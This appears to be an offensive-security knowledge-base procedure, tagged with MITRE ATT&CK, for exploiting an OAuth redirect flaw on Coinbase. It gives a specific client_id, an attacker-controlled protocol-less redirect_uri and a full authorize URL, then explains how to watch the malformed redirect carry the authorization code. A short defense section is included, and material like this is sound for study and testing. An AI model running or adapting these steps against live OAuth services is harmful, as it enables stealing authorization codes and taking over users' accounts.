---
id: proc-initiate-oauth-flow
tags:
  - oauth
  - authorization
  - redirect
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:31:10.786Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Initiate OAuth Flow with Malformed URI

## Summary

This procedure initiates the OAuth authorization flow using a registered protocol-less redirect URI, causing the Coinbase endpoint to generate a malformed redirect URL that concatenates the base domain with the URI.

## Description

By accessing the `/oauth/authorize` endpoint with specific parameters including a protocol-less `redirect_uri`, the server constructs an invalid URL like `www.coinbase.comprashanthvarma.in/code.php`. This step demonstrates the vulnerability in the flow, setting up the redirect for potential interception without user interaction beyond authorization.

## Requirements

1. Valid client_id from prior app registration
2. Web browser or curl for endpoint access
3. User account for authorization simulation

## Defense

Defensive measures and detection strategies:

- Validate all redirect_uris in requests against registered absolute URIs
- Log and alert on requests with protocol-less URIs
- Use state parameters to prevent CSRF in flows

## Objectives

1. Trigger the authorization endpoint with malformed parameters
2. Observe the concatenated redirect behavior
3. Prepare for domain interception in subsequent steps

## Instructions

### Step 1: Construct Authorization URL

**Context**: Build the request URL with required OAuth parameters.

Set parameters: `response_type=code`, `client_id=3616ab93541ef90540a0c991e113b22c1ccefa96996f70fcdc49a68d900cb761`, `redirect_uri=prashanthvarma.in/code.php`, `scope=user`.

### Step 2: Access Endpoint

**Context**: Send the request to initiate the flow.

Navigate to `https://www.coinbase.com/oauth/authorize?response_type=code&client_id=<client_id>&redirect_uri=prashanthvarma.in/code.php&scope=user` in a browser.

> Upon user approval, the redirect occurs to the malformed URL.

### Step 3: Monitor Redirect

**Context**: Capture the redirect location.

Use browser dev tools to inspect the Location header or URL bar for `www.coinbase.comprashanthvarma.in/code.php`.

**Expected Output**: Redirect to concatenated domain with authorization code in query if approved.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- oauth
- flow-initiation
- malformed-redirect
